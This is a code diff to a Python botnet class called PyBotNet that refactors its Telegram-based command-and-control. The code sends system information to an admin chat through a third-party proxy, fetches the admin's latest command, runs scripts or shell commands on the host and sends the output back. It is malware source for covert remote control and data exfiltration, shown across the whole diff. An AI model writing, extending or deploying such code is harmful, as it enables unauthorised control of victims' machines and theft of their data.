@@ -53,35 +53,13 @@ class PyBotNet:
 
         if self.send_system_data:
             message = f'{message} \n\n {util.get_short_system_info()}'
-
-        self.api_url = util.make_send_message_api_url(
-            self.TELEGRAM_TOKEN, self.ADMIN_CHAT_ID, message)
-
-        return util.post_data_by_third_party_proxy(self.api_url, self.logger)
-
-    def send_message(self, message):
-        '''Send messages by api url to adimn'''
-
-        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
-                                                      self.ADMIN_CHAT_ID, message)
-
-        return util.post_data(self.api_url, self.logger)
+        return util.send_message_by_third_party_proxy(message, self.TELEGRAM_TOKEN, self.ADMIN_CHAT_ID, self.logger)
 
     def get_last_command_by_third_party_proxy(self):
         '''return last admin message or False'''
-
-        messages_list = (util.get_update_by_third_party_proxy(
-            self.TELEGRAM_TOKEN, self.logger))
-
-        # if message list not False > extract last message from admin > if last admin message not False return
-        if messages_list:
-            last_message = util.extract_last_admin_command(
-                messages_list, self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN, self.logger, self.previous_update_id)
-
-            if last_message:
-                return last_message
-
-        return False
+        return util.get_last_admin_command_by_third_party_proxy(
+            self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN,
+            self.previous_update_id, self.logger)
 
     def get_and_execute_scripts_by_third_party_proxy(self):
         '''
@@ -98,7 +76,9 @@ class PyBotNet:
                     f'command received: \n{self.command}')
 
                 self.output = scripts.execute_scripts(
-                    self.command, self.pybotnet_up_time(), self.is_shell, self.logger)
+                    self.command, self.pybotnet_up_time(), self.is_shell,
+                    self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN,
+                    self.previous_update_id, self.logger)
 
                 if self.output:
                     self.send_message_by_third_party_proxy(
